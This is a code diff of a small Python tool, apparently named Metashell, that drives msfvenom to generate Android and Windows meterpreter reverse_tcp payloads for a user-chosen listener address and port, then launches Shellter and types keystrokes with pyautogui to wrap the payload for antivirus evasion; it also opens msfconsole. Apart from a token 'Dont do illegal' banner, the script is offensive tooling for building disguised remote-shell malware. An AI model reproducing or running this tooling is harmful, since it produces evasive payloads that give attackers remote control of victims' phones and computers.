@@ -1,49 +1,45 @@
-import os
-import time
-import colorama
-from colorama import Fore
-os.system("clear")
-def ct(tup):
-    str = ''.join(tup)
-    return str
+import os;import time;import colorama;from colorama import Fore;import pyautogui;
+os.system("cls");
 def main():
-  user = input("platform A/W or options M/E: ")
+  def ct(tup):str = ''.join(tup);return str;
+  user = input("platform A/W, options M/E/L: ")
   if (user == "a"):
     lhost = input("lhost=")
     lport = input("lport=")
     cmd = ("msfvenom -p android/meterpreter/reverse_tcp LHOST=",lhost," LPORT=",lport," -o pay.apk")
     str = ct(cmd)
     os.system(str)
-    os.system("sheller")
+    os.system("shellter.exe")
+    pyautogui.typewrite("a");pyautogui.press("enter");pyautogui.typewrite("pay.apk");pyautogui.press("enter");pyautogui.typewrite("l");pyautogui.press("enter");pyautogui.typewrite("1");pyautogui.press("enter");
   if (user == "w"):
     lhost = input("lhost=")
-    lport = input("lport=")
+    lport = input("lhost=")
     cmd = ("msfvenom -p windows/meterpreter/reverse_tcp LHOST=",lhost," LPORT=",lport," -o pay.exe")
     str = ct(cmd)
     os.system(str)
-    os.system("sheller")
+    os.system("shellter.exe")
+    pyautogui.typewrite("a");pyautogui.press("enter");pyautogui.typewrite("pay.exe");pyautogui.press("enter");pyautogui.typewrite("l");pyautogui.press("enter");pyautogui.typewrite("1");pyautogui.press("enter");
   if (user == "m"):
     lhost = input("lhost=")
-    lport = input("lport=")
-    cmd = ("msfconsole && use multi/exploit && payload = windows/meterpreter/reverse_tcp && LHOST=",lhost," && LPORT=",lport)
+    cmd = ("msfconsole")
     str = ct(cmd)
     os.system(str)
-  if(user == "e"):
-    exit()
-  
+  if(user == "e"):exit();
+  if (user == "l"):
+    print("  *3/9/23 10:30:created the program today!(v0.1)")
+    print("  *3/10/23 10:15:added automation using pyautogui.(v0.2)")
+    print("  *3/10/23 PH:added the constituent programs to the main program.(v0.2.2)")
 print(Fore.RED + '''
    _____          __                .__           .__  .__   
   /     \   _____/  |______    _____|  |__   ____ |  | |  |  
  /  \ /  \_/ __ \   __\__  \  /  ___/  |  \_/ __ \|  | |  |  
 /    Y    \  ___/|  |  / __ \_\___ \|   Y  \  ___/|  |_|  |__
 \____|__  /\___  >__| (____  /____  >___|  /\___  >____/____/
-        \/     \/          \/     \/     \/     \/           V0.1
+        \/     \/          \/     \/     \/     \/           v0.2.2
 Made by puttyX
 -------------------
-|                 |
 | Dont do illegal |
-|                 |
 -------------------
 ''')
 while 0 < 1:
-  main()
+    main()
